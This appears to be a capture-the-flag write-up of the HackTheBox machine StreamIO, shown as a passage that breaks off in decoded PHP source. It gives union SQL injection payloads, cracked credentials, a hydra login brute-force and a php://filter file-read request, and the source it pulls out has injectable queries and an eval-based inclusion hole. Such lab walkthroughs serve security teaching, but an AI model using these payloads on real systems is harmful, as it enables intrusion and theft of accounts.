---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - WinPEAS
  - Firefox-Decrypt
  - SQLI
  - Remote-File-Inclusion
  - PyLAPS
  - DACLedit
---
# Overview

| Name        | StreamIO    |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -p- -T4 10.129.87.124
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-16 04:59 CDT
Nmap scan report for 10.129.87.124
Host is up (0.076s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-16 17:01:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2025-10-16T17:03:07+00:00; +7h00m00s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-title: Not Found
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-16T17:02:26
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

```bash
$ dig +short any streamio.htb @10.129.87.124
10.129.87.124
dc.streamio.htb.
dc.streamio.htb. hostmaster.streamio.htb. 287 900 600 86400 3600
dead:beef::1c20:6d60:8e58:47f
dead:beef::2166:ea87:142a:804b
```

```bash
echo -e "10.129.87.124\tstreamio.htb dc.streamio.htb watch.streamio.htb" | sudo tee -a /etc/hosts
```

Port is is just as always normal IIS site.

![[streamio.png]]

Go to `https://streamio.htb:443`:

![[streamio2.png]]
# Enumeration
## Directory Fuzzing

```bash
$ gobuster dir -u https://streamio.htb/ -w /usr/share/wordlists/dirb/big.txt -k -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/ADMIN                (Status: 301) [Size: 150] [--> https://streamio.htb/ADMIN/]
/Admin                (Status: 301) [Size: 150] [--> https://streamio.htb/Admin/]
/About.php            (Status: 200) [Size: 7825]
/Contact.php          (Status: 200) [Size: 6434]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/Index.php            (Status: 200) [Size: 13497]
/Login.php            (Status: 200) [Size: 4145]
/about.php            (Status: 200) [Size: 7825]
```

There is nothing to do here really. Even fuzzing `/admin/` doesn't seem to give us anything interesting (403) 

```bash
gobuster dir -u https://streamio.htb/admin -w /usr/share/wordlists/dirb/big.txt -k -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/admin
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/Images/]
/Index.php            (Status: 403) [Size: 18]
/css                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/css/]
/fonts                (Status: 301) [Size: 156] [--> https://streamio.htb/admin/fonts/]
/images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/images/]
/index.php            (Status: 403) [Size: 18]
/js                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/js/]
/master.php           (Status: 200) [Size: 58]
```

`/master.php` says:

```
Movie managment
Only accessable through includes
```

So I tried looking at `https://watch.streamio.htb`. 

![[streamio3.png]]

```bash
$ gobuster dir -u https://watch.streamio.htb/ -w /usr/share/wordlists/dirb/big.txt -k -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Index.php            (Status: 200) [Size: 2829]
/Search.php           (Status: 200) [Size: 253887]
```

We can go to `/search.php`.
# Initial Foothold
## Union Based SQLi

![[streamio4.png]]

```
POST /search.php HTTP/1.1
Host: watch.streamio.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://watch.streamio.htb/search.php
Content-Type: application/x-www-form-urlencoded
Origin: https://watch.streamio.htb
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1
Priority: u=0, i
TE: trailers
Content-Length: 5

q=lol

```

Okay so SQLMap won't work it seems as it is blocked by the WAF.

Since the query request database entries based on a giving input, we might be able to extract arbitrary database entries with a union injection. For this to work, we first need to find out how many columns a database fetch contains, so we will be able to see the queried information. For this we can use `test' union slect 1,2...,X; --` iteratively until we get a response. After testing for this, we get a valid response for `test' union select 1,2,3,4,5,6; --`, with the output visualizing columns 2 and 3. Now, we can replace the entries 2 or 3 (preferably 2 due to the field size on the website) to correspond to other queries.

![[streamio5.png]]

`test' union select 1,name,3,4,5,6 from master..sysdatabases; --`

![[streamio6.png]]

`test' union select 1,name,3,4,5,6 from syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users'); --`

![[streamio7.png]]

`test' union select 1,concat(username,':',password),3,4,5,6 from users; --`

![[streamio8.png]]

We get these:

```
admin:665a50ac9eaa781e4f7f04199db97a11
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barbra:3961548825e3e21df5646cafe11c6c76
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Baxter:22ee218331afd081b0dcd8115284bae3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon:35394484d89fcfdb3c5e447fe749d213
Clara:ef8f3d30a856cf166fb8215aca93e9ff
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield:8097cedd612cc37c29db152b6e9edbd3
Gloria:0cfaaaafb559f081df2befbe66686de0
James:c660060492d9edcaa8332d89c99c9239
Juliette:6dcd87740abb64edfa36d170f0d5450d
Lauren:08344b85b329d7efd611b7a7743e8a09
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Robert:f03b910e2bd0313a23fdd7575f34a694
Robin:dc332fb5576e9631c9dae83f194f8e70
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Samantha:083ffae904143c4796e464dac33c1f7d
Stan:384463526d288edcc95fc3701e523bc7
Thane:3577c47eb1e12c8ba021611e1280753c
Theodore:925e5408ecb67aea449373d668b7359e
Victor:bf55e15b119860a6e6b5a164377da719
Victoria:b22abb47a02b52d5dfa27fb0b534f693
William:d62be0dc82071bccc1322d64ec5b6c51
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
```

Hashes are MD5.

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --username --force
```

```
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$ Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara dfdfdf:ae27a4b4821b13cad2a17a75d219853e:dfdfdf Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123## Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123 Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$ Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8! yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

But spraying these in SMB won't work or any other using NXC maybe its only for site.

We can try here `https://streamio.htb/login.php`.

```
admin
Barry
Bruno
Clara
dfdfdf
Juliette
Lauren
Lenord
Michelle
Sabrina
Thane
Victoria
yoshihide
```

```
paddpadd
$hadoW
$monique$1991$
%$clara
dfdfdf
$3xybitch
##123a8j8w5123##
physics69i
!?Love?!123
!!sabrina$
highschoolmusical
!5psycho8!
66boysandgirls..
```
## Hydra

```bash
$ hydra -L users -P passwords streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-16 05:54:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 169 login tries (l:13/p:13), ~11 tries per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:Login failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
```

Login in site with `yoshihide:66boysandgirls..`.

Now we are logged in going to `https://streamio.htb/admin/` seems to give us access.

![[streamio9.png]]

We get four links:

```
https://streamio.htb/admin/?user=
https://streamio.htb/admin/?staff=
https://streamio.htb/admin/?movie=
https://streamio.htb/admin/?message=
```

We can try fuzzing other parameter.
## Parameter Fuzzing

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u https://streamio.htb/admin/?FUZZ= -H "Cookie: PHPSESSID=tnj9f7o4uctij2p3te5eqnnm1b" -fs 1678

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 79ms]
```

![[streamio10.png]]

We can try file inclusion to read `master.php` in base64 wrapper.

```bash
https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=master.php
```

And we get this:

```
onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg== 
```

![[streamio11.png]]

```bash
$ echo -n "onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d
�yr<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
